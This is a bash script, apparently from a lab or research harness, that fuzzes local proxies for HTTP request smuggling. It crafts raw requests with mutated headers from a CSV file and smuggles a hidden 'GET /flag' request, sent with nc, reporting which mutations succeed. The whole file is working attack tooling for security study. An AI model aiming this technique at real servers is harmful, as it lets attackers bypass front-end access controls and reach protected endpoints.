#!/usr/bin/env bash

if [[ ${DEBUG-} =~ ^1|yes|true$ ]]; then
  set -o xtrace
fi
set -o errtrace
set -o nounset
set -o pipefail

if [ $# -eq 0 ]
  then
    echo "please run this with port number of target proxy 8001 - 8004"
fi
PORT=$1

DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"

crlf () {
  printf "$1\r\n"
}

request_builder () {
  {
    crlf "GET /hello HTTP/1.1"
    crlf "Host: 0.0.0.0:${PORT}"
    crlf "Content-Length: 47"
    crlf "${1}"
    crlf ""
    crlf "0"
    crlf ""
    crlf "GET /flag HTTP/1.1"
    crlf "Host: 0.0.0.0:${PORT}"
    crlf ""
    crlf "GET /hello HTTP/1.1"
    crlf "Host: 0.0.0.0:${PORT}"
    crlf ""
  }
}

while IFS=, read -r name mutation
do
  request_builder "$mutation"| nc 0.0.0.0 ${PORT} | grep --quiet deadbeef && printf "%s\n" "💀 $name"
done < "$DIR/mutations.csv"
